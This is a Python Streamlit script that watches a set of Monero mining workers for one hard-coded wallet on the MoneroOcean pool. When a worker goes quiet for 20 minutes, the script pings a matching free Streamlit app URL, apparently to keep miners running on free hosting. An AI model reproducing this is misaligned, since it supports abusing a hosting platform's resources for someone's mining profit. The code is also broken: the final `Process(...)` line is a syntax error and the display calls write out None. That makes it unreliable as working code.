import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 20:
    # mxt v 1
    if worker == "mxt":
      requests.get("https://vyom00907-mxtcot-app-ikd0lj.streamlit.app/")
    if worker == "mxtgen01":
      requests.get("https://mxt-vyom00907.streamlit.app/")
    if worker == "mxtgen1":
      requests.get("https://vyom00907-mxtfaujh-mxtgen1-pck5yt.streamlit.app/")
    if worker == "mxtgen2":
      requests.get("https://vyom00907-mxtfaujh-mxtgen2-w6l8nj.streamlit.app/")
    if worker == "mxtgen3":
      requests.get("https://vyom00907-mxtfaujh-mxtgen3-e202e2.streamlit.app/")
    if worker == "mxtgen4":
      requests.get("https://vyom00907-mxtfaujh-mxtgen4-pxwkrs.streamlit.app/")
    if worker == "mxtgen5":
      requests.get("https://vyom00907-mxtfaujh-mxtgen5-yjt88z.streamlit.app/")
    if worker == "mxtgen6":
      requests.get("https://vyom00907-mxtfaujh-mxtgen6-yto63j.streamlit.app/")
    if worker == "mxtgen7":
      requests.get("https://vyom00907-mxtfaujh-mxtgen7-jhx3x5.streamlit.app/")
    if worker == "mxtgen8":
      requests.get("https://vyom00907-mxtfaujh-mxtgen8-klnuoc.streamlit.app/")
    #mxt v2 
    if worker == "mv2gen1":
      requests.get("https://vyom00907-mv2faujh-mv2gen1-liilfe.streamlit.app/")
    if worker == "mv2gen2":
      requests.get("https://vyom00907-mv2faujh-mv2gen2-k8o2nr.streamlit.app/")
    if worker == "mv2gen3":
      requests.get("https://vyom00907-mv2faujh-mv2gen3-zezt1k.streamlit.app/")
    if worker == "mv2gen4":
      requests.get("https://vyom00907-mv2faujh-mv2gen4-ct891n.streamlit.app/")
    if worker == "mv2gen5":
      requests.get("https://vyom00907-mv2faujh-mv2gen5-mnagn0.streamlit.app/")
    if worker == "mv2gen6":
      requests.get("https://vyom00907-mv2faujh-mv2gen6-u9yndz.streamlit.app/")
    if worker == "mv2gen7":
      requests.get("https://vyom00907-mv2faujh-mv2gen7-u8kxke.streamlit.app/")
    if worker == "mv2gen8":
      requests.get("https://vyom00907-mv2faujh-mv2gen8-irrnfx.streamlit.app/")
    if worker == "mv2gen9":
      requests.get("https://vyom00907-mv2faujh-mv2gen9-rlq22f.streamlit.app/")
    if worker == "mv2gen10":
      requests.get("https://vyom00907-mv2faujh-mv2gen10-sz9de1.streamlit.app/")
      
      
      
      

  st.write(worker,"last share", lstnt, "mins ago")
  

dcon = st.container()

def ch():
  while 1==1 :
    dcon.write(resp("mxt"))
    dcon.write(resp("mxtgen01"))
    dcon.write(resp("mxtgen1"))
    dcon.write(resp("mxtgen2"))
    dcon.write(resp("mxtgen3"))
    dcon.write(resp("mxtgen4"))
    dcon.write(resp("mxtgen5"))
    dcon.write(resp("mxtgen6"))
    dcon.write(resp("mxtgen8"))
    dcon.write(resp("mv2gen1"))
    dcon.write(resp("mv2gen2"))
    dcon.write(resp("mv2gen3"))
    dcon.write(resp("mv2gen4"))
    dcon.write(resp("mv2gen5"))
    dcon.write(resp("mv2gen6"))
    dcon.write(resp("mv2gen7"))
    dcon.write(resp("mv2gen8"))
    dcon.write(resp("mv2gen9"))
    dcon.write(resp("mv2gen10"))
    st.empty()
  
proc = Process(target=ch, args =((,) )



proc.start()

  
